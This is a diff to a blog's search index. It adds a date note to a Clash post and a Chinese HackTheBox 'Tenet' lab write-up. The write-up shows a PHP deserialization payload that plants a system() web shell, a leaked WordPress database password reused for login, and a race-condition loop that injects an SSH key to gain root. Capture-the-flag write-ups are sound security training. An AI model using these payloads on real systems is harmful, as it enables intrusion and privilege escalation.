@@ -6669,7 +6669,8 @@
   <entry>
     <title>clash-arch自启更新订阅</title>
     <url>/2020/05/20/clash-arch%E8%87%AA%E5%90%AF%E6%9B%B4%E6%96%B0%E8%AE%A2%E9%98%85/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>linux下clash不会自动更新订阅。只好自己去看看怎么写了。我对<code>systemd</code>不太熟悉所以只好去参考下别人的写法。</p>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p><strong>本文写于2020/05/20日，部分命令或软件已不适用。</strong></p>
+<p>linux下clash不会自动更新订阅。只好自己去看看怎么写了。我对<code>systemd</code>不太熟悉所以只好去参考下别人的写法。</p>
 <a id="more"></a>
 
 <blockquote>
@@ -10702,6 +10703,98 @@ column_name  列名</code></pre><p>确认表中有多少字段（order by）</p>
       <tags>
         <tag>others</tag>
         <tag>Nginx</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HackTheBox-Tenet</title>
+    <url>/2021/03/03/HackTheBox-Tenet/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><ul>
+<li>Name:Tenet</li>
+<li>OS:Linux</li>
+</ul>
+<p><img src="https://www.hackthebox.eu/storage/avatars/6bd8b01a1b84e16a5ee2e53d070339fd_thumb.png" alt="tenet"></p>
+<a id="more"></a>
+
+<h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -p- tenet.htb</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">22&#x2F;tcp open  ssh</span><br><span class="line">80&#x2F;tcp open  http</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -p 22,80 --script vuln -A tenet.htb</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">.......</span><br><span class="line">.......</span><br><span class="line">.......</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">| http-enum:</span><br><span class="line">|   &#x2F;wp-login.php: Possible admin folder</span><br><span class="line">|   &#x2F;readme.html: Wordpress version: 2</span><br><span class="line">|   &#x2F;: WordPress version: 5.6</span><br><span class="line">|   &#x2F;wp-includes&#x2F;images&#x2F;rss.png: Wordpress version 2.2 found.</span><br><span class="line">|   &#x2F;wp-includes&#x2F;js&#x2F;jquery&#x2F;suggest.js: Wordpress version 2.5 found.</span><br><span class="line">|   &#x2F;wp-includes&#x2F;images&#x2F;blank.gif: Wordpress version 2.6 found.</span><br><span class="line">|   &#x2F;wp-includes&#x2F;js&#x2F;comment-reply.js: Wordpress version 2.7 found.</span><br><span class="line">|   &#x2F;wp-login.php: Wordpress login page.</span><br><span class="line">|   &#x2F;wp-admin&#x2F;upgrade.php: Wordpress login page.</span><br><span class="line">|_  &#x2F;readme.html: Interesting, a readme.</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)</span><br><span class="line">|_http-stored-xss: Couldn&#39;t find any stored XSS vulnerabilities.</span><br><span class="line">| http-wordpress-users:</span><br><span class="line">| Username found: protagonist</span><br><span class="line">| Username found: neil</span><br></pre></td></tr></table></figure>
+<p>80端口有wordpress，nmap找到两个用户名，可以考虑爆破？<br>wordpress 版本是 5.6</p>
+<h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><p>访问 <a href="http://tenet.htb，随意浏览。" target="_blank" rel="noopener">http://tenet.htb，随意浏览。</a></p>
+<p>在Migration文章下面发现neil用户的一个评论</p>
+<p><img src="https://images.atsud0.me/images/post/20210303-12:23:09-_xcDeKx_qGQkMP.png" alt="20210303-12:23:09-_xcDeKx_qGQkMP"></p>
+<blockquote>
+<p>did you remove the sator php file and the backup?? the migration program is incomplete! why would you do this?!</p>
+</blockquote>
+<p>sator php? sator.php?</p>
+<p>直接在网站根目录下访问sator.php，但是不行，尝试将sator.tenet.htb 绑定到/etc/hosts..就可以了。。</p>
+<p>然后在sator.tenet.htb下面，访问sator.php。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;sator.tenet.htb&#x2F;sator.php</span><br><span class="line">[+] Grabbing users from text file &lt;br&gt;</span><br><span class="line">[] Database updated &lt;br</span><br></pre></td></tr></table></figure>
+
+<p>不知道干啥的。。想起来他说有备份文件，试试bak后缀。</p>
+<p>嗯，拿到源码。看起来要进行反序列化。</p>
+<h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><h3 id="源码研究"><a href="#源码研究" class="headerlink" title="源码研究"></a>源码研究</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DatabaseExport</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $user_file = <span class="string">'users.txt'</span>;</span><br><span class="line">	<span class="keyword">public</span> $data = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_db</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'[+] Grabbing users from text file &lt;br&gt;'</span>; <span class="comment">#打印了这段话，（无关心</span></span><br><span class="line">		<span class="keyword">$this</span>-&gt; data = <span class="string">'Success'</span>; <span class="comment">#将success 传递给变量$data</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> #重写了销毁，销毁会在网页代码执行结束时，或者是没有变量指向它时执行。</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		file_put_contents(<span class="keyword">__DIR__</span> . <span class="string">'/'</span> . <span class="keyword">$this</span> -&gt;user_file, <span class="keyword">$this</span>-&gt;data); <span class="comment">#在当前目录下创建一个名为$user_file,内容为$data的文件</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'[] Database updated &lt;br&gt;'</span>;</span><br><span class="line">		<span class="comment">#打印这段话（无关心</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$input = $_GET[<span class="string">'arepo'</span>] ?? <span class="string">''</span>; <span class="comment">#如果GET参数arepo不存在时，返回空，否则返回arepo的值</span></span><br><span class="line">$databaseupdate = unserialize($input); <span class="comment">#将input字符串还原成一个对象</span></span><br><span class="line"></span><br><span class="line">$app = <span class="keyword">new</span> DatabaseExport;  </span><br><span class="line">$app -&gt; update_db();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里用到了反序列化，所以我得知道序列化之后的字符串长什么样子，然后我们自己构造一下，添油加醋，传递给arepo变量。</p>
+<p>序列化之后的字符串大概长这个样子(假设对象中有两个属性)</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:&lt;class_name_length&gt;:&quot;&lt;class_name&gt;&quot;:&lt;number_of_properties&gt;:&#123;s:&lt;properties1_name_length&gt;:&quot;&lt;properties1_name&gt;&quot;;s:&lt;properties1_value_length&gt;:&quot;&lt;properties1_value&gt;&quot;;s:&lt;properties2_name_length&gt;:&quot;&lt;properties2_name&gt;&quot;;s:&lt;properties2_value_length&gt;:&quot;&lt;properties2_value&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><code>class_name_length</code>对象名字的长度</p>
+<p><code>&lt;class name&gt;</code>类名</p>
+<p><code>&lt;number_of_properties&gt;</code>对象属性个数总和</p>
+<p><code>&lt;properties1_name_length&gt;</code> 第一个对象属性的名字的长度</p>
+<p><code>&lt;properties1_name&gt;</code> 第一个对象属性的名字<br><code>&lt;properties1_value_length&gt;</code> 第一个对象属性的值的长度<br><code>&lt;properties1_value&gt;</code>第一个对象属性的值。。。如此类推</p>
+</blockquote>
+<p>所以<code>sator.php</code>的对象是<code>DatabaseExport</code></p>
+<p>这个<code>DatabaseExport</code>对象，又有两个公有属性分别是<code>user_file</code>和<code>data</code>，所以之后就是完形填空了。。。</p>
+<p>序列化之后的字符串。（也可以直接在sator.php代码中 <code>echo serialize($app);</code>就出来了。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:14:&quot;DatabaseExport&quot;:2:&#123;s:9:&quot;user_file&quot;;s:9:&quot;users.txt&quot;;s:4:&quot;data&quot;;s:0:&quot;&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>构造的字符串</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:14:&quot;DatabaseExport&quot;:2:&#123;s:9:&quot;user_file&quot;;s:9:&quot;users.php&quot;;s:4:&quot;data&quot;;s:30:&quot;&lt;?php echo(system($_GET[a]))?&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://images.atsud0.me/images/post/20210303-14:07:09-_CMZroY_AID4jk.png" alt="20210303-14:07:09-_CMZroY_AID4jk"></p>
+<p>最后会在当前目录下生成一个users.php的文件。文件的值就是我们所构造的。</p>
+<p>嗯，访问users.php是200，不是404，尝试whoami一下，成功。</p>
+<p><img src="https://images.atsud0.me/images/post/20210303-13:37:47-_THbNQr_pgMMHZ.png" alt="20210303-13:37:47-_THbNQr_pgMMHZ"></p>
+<p>获得立足点。<br><img src="https://images.atsud0.me/images/post/20210303-14:19:29-_WhqTvY_f7AX8b.png" alt="20210303-14:19:29-_WhqTvY_f7AX8b"></p>
+<h2 id="0x03-提权"><a href="#0x03-提权" class="headerlink" title="0x03 提权"></a>0x03 提权</h2><p>先去看了下wp-setting.php</p>
+<p><img src="https://images.atsud0.me/images/post/20210303-14:20:30-_04OQkV_sDrU3l.png" alt="20210303-14:20:30-_04OQkV_sDrU3l"></p>
+<p>获得一个密码，不知道有没有密码复用</p>
+<blockquote>
+<p>neil：Opera2112</p>
+</blockquote>
+<p>看了下/etc/passwd</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">landscape:x:108:112::&#x2F;var&#x2F;lib&#x2F;landscape:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">pollinate:x:109:1::&#x2F;var&#x2F;cache&#x2F;pollinate:&#x2F;bin&#x2F;false</span><br><span class="line">sshd:x:110:65534::&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mysql:x:111:115:MySQL Server,,,:&#x2F;nonexistent:&#x2F;bin&#x2F;false</span><br><span class="line">neil:x:1001:1001:neil,,,:&#x2F;home&#x2F;neil:&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
+<p>neil这个用户存在，所以打开一个伪终端，尝试用这个密码切换用户</p>
+<p><img src="https://images.atsud0.me/images/post/20210303-14:26:14-_PD09zK_6WSJ8Z.png" alt="20210303-14:26:14-_PD09zK_6WSJ8Z"></p>
+<p>user-flag</p>
+<p><img src="https://images.atsud0.me/images/post/20210303-14:27:56-_PqewDF_GieWXB.png" alt="20210303-14:27:56-_PqewDF_GieWXB"></p>
+<p><code>sudo -l</code>可以执行这个/usr/local/bin/enableSSH.sh文件。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Matching Defaults entries for root on tenet:</span><br><span class="line">    env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:</span><br><span class="line"></span><br><span class="line">    User neil may run the following commands on tenet:</span><br><span class="line">        (ALL : ALL) NOPASSWD: &#x2F;usr&#x2F;local&#x2F;bin&#x2F;enableSSH.sh</span><br></pre></td></tr></table></figure>
+
+<p>但是有配置<code>secure_path</code>，原本想试试环境变量提权的。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">addKey() &#123;</span><br><span class="line">        # 在&#x2F;tmp下创建一个文件名为 ssh-(随机)</span><br><span class="line">        tmpName&#x3D;$(mktemp -u &#x2F;tmp&#x2F;ssh-XXXXXXXX)</span><br><span class="line">        # 修改创建默认文件的默认权限</span><br><span class="line">        (umask 110; touch $tmpName)</span><br><span class="line"></span><br><span class="line">        # 将公钥写进去</span><br><span class="line">        &#x2F;bin&#x2F;echo $key &gt;&gt;$tmpName</span><br><span class="line"></span><br><span class="line">        checkFile $tmpName</span><br><span class="line"></span><br><span class="line">        # 把$tmpName文件追加到authorized_keys</span><br><span class="line">        &#x2F;bin&#x2F;cat $tmpName &gt;&gt;&#x2F;root&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line"></span><br><span class="line">        # 然后删掉$tmpName</span><br><span class="line">        &#x2F;bin&#x2F;rm $tmpName</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以我们写个脚本，让他死循环，往tmp目录下ssh-开头的所有文件去写我们的公钥，或许能登陆？</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">while :</span><br><span class="line">do</span><br><span class="line">    echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDcZ7NUYzu7L02TlZawnID2FL9O8jZFBV7BFeum&#x2F;vOkPISieLAT8kbVBKuRxwpSryGJA2elfFHgOkPGnNPL+UD0zKes3SUWOm02rxRBZXt0LIrLXTd1yRNouJ1NTkzdBO1pGy2Sly0GNYGwmJ8NIlOhqjq+tEqR9DFt0BPPDfHOvqyr7DyZ00OgkA22wYIyVQoSsdqmIEGDNVF7u5c8isahm0UGQu+zHV0YQAusS17dA6pyFiOrXpWT4mwq8nVdFTHmmQqqYkGhZvdutoFG2JVTuFFPRjEyAo5hmfadIo+qdUwa10KUNhT2WyrQBLSf3CPNV3DVVBl9XXUP9jHFslSx neil@tenet&quot; | tee &#x2F;tmp&#x2F;ssh* &gt; &#x2F;dev&#x2F;null</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://images.atsud0.me/images/post/20210303-16:06:28-_LvwSr1_zxyrNJ.jpg" alt="20210303-16:06:28-_LvwSr1_zxyrNJ"></p>
+<h2 id="0x03-总结-amp-参考"><a href="#0x03-总结-amp-参考" class="headerlink" title="0x03 总结 &amp; 参考"></a>0x03 总结 &amp; 参考</h2><ul>
+<li><a href="https://linux.cn/article-3737-1.html" target="_blank" rel="noopener">secure_path</a></li>
+<li><a href="https://xz.aliyun.com/t/3674" target="_blank" rel="noopener">PHP反序列化由浅入深</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>靶机实验</category>
+        <category>HackTheBox</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+        <tag>Unserialize</tag>
+        <tag>PHP</tag>
       </tags>
   </entry>
 </search>
